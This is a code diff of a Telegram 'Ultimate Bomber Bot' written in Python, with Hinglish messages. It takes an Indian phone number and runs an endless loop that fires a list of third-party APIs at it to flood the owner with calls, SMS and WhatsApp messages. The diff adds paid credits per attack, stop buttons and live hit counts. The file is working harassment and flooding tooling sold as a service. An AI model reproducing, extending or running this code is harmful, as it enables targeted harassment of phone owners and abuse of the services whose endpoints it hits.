+    # Balance Check
+    if u_data["credits"] < 5:
+        await message.answer(
+            f"❌ <b>Low Balance!</b>\n"
+            f"Aapke pass {u_data['credits']} credits hain (Chahiye: 5 Credits).\n\n"
+            f"Recharge ke liye '💰 Buy Credits' check karein.",
+            reply_markup=create_main_keyboard(user_id)
+        )
+        return
+    
+    # Phone number validation
     if not phone.startswith(('6', '7', '8', '9')):
         await message.answer(
-            "❌ <b>Invalid phone number!</b>\n"
-            "Indian numbers start with 6,7,8, or 9.\n"
-            "Please enter a valid 10-digit number.",
+            "❌ <b>Galat Number!</b>\n"
+            "Indian phone number 6, 7, 8 ya 9 se shuru hona chahiye.",
             parse_mode="HTML"
         )
         return
     
-    # Initialize attack
+    # Deduct 5 Credits
+    db["users"][str(user_id)]["credits"] -= 5
+    db["users"][str(user_id)]["total_attacks"] += 1
+    save_db(db)
+    
+    # State reset
     stop_signals[user_id] = False
     user_attacks[user_id] = {
         'phone': phone,
         'start_time': time.time(),
-        'delay': 5,  # Default delay
+        'delay': 5,
         'cycles': 0
     }
     attack_stats[user_id] = {
@@ -663,38 +569,21 @@ async def handle_phone_number(message: types.Message):
         'last_update': time.strftime('%H:%M:%S')
     }
     
-    # Send starting animation
     start_msg = await message.answer(
-        "🎯 <b>INITIALIZING ATTACK...</b>\n\n"
-        f"<b>Target:</b> <code>{phone}</code>\n"
-        f"<b>APIs Loaded:</b> {len(ULTIMATE_APIS)}\n"
-        f"<b>Mode:</b> INFINITE\n\n"
-        "⚡ Preparing to fire...",
+        "🎯 <b>ATTACK INITIALIZING...</b>\n\n"
+        f"🎯 <b>Target:</b> <code>{phone}</code>\n"
+        f"⚡ <b>5 Credits Deducted</b> (Left: {db['users'][str(user_id)]['credits']})\n\n"
+        "🚀 Server se connection banaya ja raha hai...",
         parse_mode="HTML",
         reply_markup=create_stop_keyboard()
     )
     
-    # Run animation
     await animate_message(message.chat.id, start_msg.message_id, f"Target: {phone}")
     
-    # Start attack in background
+    # Start Attack Task
     asyncio.create_task(run_attack(user_id, phone, message.chat.id, start_msg.message_id))
-    
-    # Update with initial status
-    await bot.edit_message_text(
-        chat_id=message.chat.id,
-        message_id=start_msg.message_id,
-        text=f"🚀 <b>ATTACK STARTED!</b>\n\n"
-             f"<b>Target:</b> <code>{phone}</code>\n"
-             f"<b>Status:</b> Firing APIs...\n"
-             f"<b>Hits:</b> 0\n"
-             f"<b>Next cycle:</b> 5s",
-        parse_mode="HTML",
-        reply_markup=create_stop_keyboard()
-    )
 
 async def run_attack(user_id, phone, chat_id, message_id):
-    """Run the attack loop"""
     stats = attack_stats[user_id]
     attack_info = user_attacks[user_id]
     delay = attack_info['delay']
@@ -708,35 +597,31 @@ async def run_attack(user_id, phone, chat_id, message_id):
                 attack_info['cycles'] = cycle_count
                 stats['cycles'] = cycle_count
                 
-                # Fire all APIs
+                # Execute Parallel API Hits
                 tasks = [hit_api(session, api, phone, stats) for api in ULTIMATE_APIS]
-                results = await asyncio.gather(*tasks, return_exceptions=True)
+                await asyncio.gather(*tasks, return_exceptions=True)
                 
-                # Calculate hits
                 calls = stats.get('Call', 0)
                 sms = stats.get('SMS', 0)
                 whatsapp = stats.get('WhatsApp', 0)
                 total = calls + sms + whatsapp
                 
-                # Update message
                 stats['last_update'] = time.strftime('%H:%M:%S')
                 
-                # Update status message
                 status_text = f"""
-🎯 <b>ACTIVE ATTACK - CYCLE {cycle_count}</b>
+🎯 <b>ATTACK RUNNING - CYCLE {cycle_count}</b>
 
-<b>Target:</b> <code>{phone}</code>
-<b>Status:</b> ⚡ RUNNING
-<b>Delay:</b> {delay}s
+📱 <b>Target:</b> <code>{phone}</code>
+⚡ <b>Status:</b> High Speed Firing Active
 
-📊 <b>STATISTICS:</b>
-<b>📞 Calls:</b> {calls}
-<b>📩 SMS:</b> {sms}
-<b>💬 WhatsApp:</b> {whatsapp}
-<b>🔥 Total Hits:</b> {total}
+📊 <b>LIVE HITS COUNT:</b>
+📞 <b>Calls:</b> {calls}
+📩 <b>SMS:</b> {sms}
+💬 <b>WhatsApp:</b> {whatsapp}
+🔥 <b>Total Hits:</b> {total}
 
-<b>Next cycle in:</b> {delay}s
-<b>Last Update:</b> {stats['last_update']}
+⏳ <b>Next Cycle:</b> {delay}s me
+🕒 <b>Last Hit:</b> {stats['last_update']}
                 """
                 
                 try:
@@ -747,21 +632,19 @@ async def run_attack(user_id, phone, chat_id, message_id):
                         parse_mode="HTML",
                         reply_markup=create_stop_keyboard()
                     )
-                except Exception as e:
-                    logger.error(f"Failed to update message: {e}")
+                except Exception:
+                    pass
                 
-                # Check if we should stop
                 if stop_signals.get(user_id, False):
                     break
                     
-                # Wait for next cycle
                 await asyncio.sleep(delay)
                 
             except Exception as e:
-                logger.error(f"Attack error for user {user_id}: {e}")
-                await asyncio.sleep(5)  # Wait before retry
+                logger.error(f"Cycle execution error: {e}")
+                await asyncio.sleep(5)
     
-    # Attack stopped
+    # Attack Finished
     final_stats = attack_stats.get(user_id, {})
     calls = final_stats.get('Call', 0)
     sms = final_stats.get('SMS', 0)
@@ -769,81 +652,100 @@ async def run_attack(user_id, phone, chat_id, message_id):
     total = calls + sms + whatsapp
     
     final_text = f"""
-🛑 <b>ATTACK STOPPED</b>
+🛑 <b>ATTACK STOP KAR DIYA GAYA HAI</b>
 
-<b>Target:</b> <code>{phone}</code>
-<b>Total Cycles:</b> {cycle_count}
-<b>Duration:</b> {time.time() - attack_info['start_time']:.1f}s
+📱 <b>Target:</b> <code>{phone}</code>
+🔄 <b>Total Cycles:</b> {cycle_count}
+⏱️ <b>Time Duration:</b> {time.time() - attack_info['start_time']:.1f}s
 
-📊 <b>FINAL STATISTICS:</b>
-<b>📞 Calls:</b> {calls}
-<b>📩 SMS:</b> {sms}
-<b>💬 WhatsApp:</b> {whatsapp}
-<b>🔥 Total Hits:</b> {total}
+📊 <b>FINAL SUMMARY:</b>
+📞 Calls Made: {calls}
+📩 SMS Delivered: {sms}
+💬 WhatsApp Sent: {whatsapp}
+🔥 <b>Total Hits: {total}</b>
 
-<b>Status:</b> ✅ COMPLETED
-<b>Time:</b> {time.strftime('%H:%M:%S')}
+✅ <i>Status: Attack Terminated</i>
     """
-    
     try:
         await bot.edit_message_text(
             chat_id=chat_id,
             message_id=message_id,
             text=final_text,
             parse_mode="HTML",
-            reply_markup=create_main_keyboard()
+            reply_markup=create_main_keyboard(user_id)
         )
-    except:
+    except Exception:
         pass
     
-    # Clean up
+    if user_id in stop_signals: del stop_signals[user_id]
+    if user_id in user_attacks: del user_attacks[user_id]
+
+# --- [ NAVIGATION & CONTROLS ] ---
+
+@dp.message(F.text == "🛑 STOP ATTACK")
+async def stop_attack(message: types.Message):
+    user_id = message.from_user.id
     if user_id in stop_signals:
-        del stop_signals[user_id]
-    if user_id in user_attacks:
-        del user_attacks[user_id]
+        stop_signals[user_id] = True
+        await message.answer(
+            "🛑 <b>Attack Stop ho raha hai...</b>\nCurrent cycle complete hote hi band ho jayega.",
+            reply_markup=create_main_keyboard(user_id)
+        )
+    else:
+        await message.answer("ℹ️ Koi bhi active attack running nahi hai.", reply_markup=create_main_keyboard(user_id))
 
-@dp.message(Command("stop"))
-async def stop_command(message: types.Message):
-    """Handle /stop command"""
-    await stop_attack(message)
+@dp.message(F.text == "📊 Live Attack Stats")
+async def live_stats(message: types.Message):
+    user_id = message.from_user.id
+    if user_id in attack_stats:
+        stats = attack_stats[user_id]
+        total = stats.get('Call', 0) + stats.get('SMS', 0) + stats.get('WhatsApp', 0)
+        await message.answer(
+            f"📊 <b>CURRENT ATTACK STATS</b>\n\n"
+            f"📞 Calls: {stats.get('Call', 0)}\n"
+            f"📩 SMS: {stats.get('SMS', 0)}\n"
+            f"💬 WhatsApp: {stats.get('WhatsApp', 0)}\n"
+            f"🔥 Combined: {total}"
+        )
+    else:
+        await message.answer("ℹ️ Koi running attack data nahi mila.")
 
-@dp.message(Command("stats"))
-async def stats_command(message: types.Message):
-    """Handle /stats command"""
-    await check_stats(message)
+@dp.message(F.text == "📊 Check Stats")
+async def check_stats(message: types.Message):
+    register_user(message.from_user.id, message.from_user.username)
+    u_data = get_user_data(message.from_user.id)
+    await message.answer(
+        f"📊 <b>ATTACK HISTORY & BALANCE</b>\n\n"
+        f"👤 Account: {u_data['username']}\n"
+        f"🚀 Total Attacks Launched: <code>{u_data['total_attacks']}</code>\n"
+        f"💰 Remaining Credits: <code>{u_data['credits']}</code>"
+    )
 
-@dp.message(Command("help"))
-async def help_command_handler(message: types.Message):
-    """Handle /help command"""
-    await help_command(message)
+@dp.message(F.text == "🏠 Main Menu")
+async def main_menu(message: types.Message):
+    await message.answer(
+        "🏠 <b>Main Menu</b>\nNeeche diye gaye option select karein:",
+        reply_markup=create_main_keyboard(message.from_user.id)
+    )
 
 @dp.message()
 async def handle_other_messages(message: types.Message):
-    """Handle other messages"""
-    if message.text:
-        await message.answer(
-            "❓ <b>Unknown command!</b>\n\n"
-            "Use /help to see available commands or use the buttons below.",
-            reply_markup=create_main_keyboard(),
-            parse_mode="HTML"
-        )
+    await message.answer(
+        "❓ <b>Invalid Input!</b>\n\nKripya buttons ka use karein ya 10-digit number bhejein.",
+        reply_markup=create_main_keyboard(message.from_user.id),
+        parse_mode="HTML"
+    )
 
+# --- [ BOT BOOTSTRAP ] ---
 async def main():
-    """Main function to start the bot"""
-    logger.info("Starting Ultimate Bomber Bot...")
-    logger.info(f"Developer: {DEVELOPER_ID}")
+    logger.info("Bot start ho raha hai...")
     logger.info(f"Loaded APIs: {len(ULTIMATE_APIS)}")
-    
     try:
-        # Start polling
         await dp.start_polling(bot)
     except Exception as e:
-        logger.error(f"Bot crashed: {e}")
-        logger.info("Restarting in 5 seconds...")
+        logger.error(f"Bot crash error: {e}")
         await asyncio.sleep(5)
-        # Restart
         await main()
 
 if __name__ == "__main__":
-    # Run the bot
     asyncio.run(main())
